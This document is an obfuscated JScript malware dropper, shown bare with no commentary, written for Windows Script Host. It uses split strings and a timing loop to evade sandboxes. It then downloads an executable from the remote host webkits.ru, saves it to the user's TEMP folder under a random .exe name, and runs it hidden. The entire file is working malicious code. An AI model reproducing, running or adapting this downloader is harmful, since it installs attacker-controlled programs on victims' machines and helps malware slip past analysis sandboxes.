var A = false;
var T = "Create"+"Object";
var UQ = function C() {return WScript[T]("WScript"+".Shell");}(), CJ = 11;
var H = "MSXML2"+".XMLHTTP";
var K = 2;
var C0 = K - 2;
function J(MM){UQ["Run"](MM, C0, C0);};
function DJ(){return H + "";};
function AD(N2, Z){C0 = C0 * 1; return N2 - Z;};
function Q(){return T;};
/*@cc_on
  @if (@_win32 || @_win64)
    A = true;
  @end
@*/
if (A)
{
var SK = "";
function EF(){return 22;};
var N0 = 0; var N = 0;
function MJ()
{
var U = new this["Date"]();
var X = U["getUTCMilliseconds"]();
WScript["Sleep"](EF());
var U = new this["Date"]();
var JX = U["getUTCMilliseconds"]();
WScript["Sleep"](EF());
var U = new this["Date"]();
var FZ = U["getUTCMilliseconds"]();
var N0 = "SZ";
N0 = AD(JX, X);
var N = "J0";
N = AD(FZ, JX);
SK = "open";
return AD(N0, N);
}
var KR = false;
var L = false;
for (var M = C0; M < EF() * 1; M++){if (MJ() != C0){
KR = true; 
N = "31" + 11 * N0 + N; 
L = true; 
break;
}}
function E() {return ((KR == true) && (KR == L)) ? 1 : C0;};
if (KR && E() && L){
function OM() {return UQ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "VmT5aN0iAgMkHj.ex" + "e";};
 K0 = DJ();
 X0 = WScript[T](K0);
 var UO = 1;
do { 
	for (;UO;){
	try {
		if (UO == 1)
		{
			X0[SK]("GET", "http://webkits.ru/mn3dka", false);
			X0["send"]();
			NK = "Sleep";
			UO = 2;
		}
		WScript[NK](EF() + 120); 
		if (X0["readystate"] < 2 * 2) continue;
		UO = C0;
		function VV(TA) {var XY = (1, 2, 3, 4, 5, TA); return XY;};
		N1 = WScript[Q()]("ADODB.Stream");
		K0 = N1;
		K0[SK]();
		K0["type"] = VV(1);
		K0["write"](X0["ResponseBody"]);
		N1["position"] = VV(C0);
		K0["Save" + "ToFile"](OM(), 2);
		N1["cl"+"ose"]();
		RR = OM();
		J(RR);
	} catch(D){};};
}while (UO);
}
}

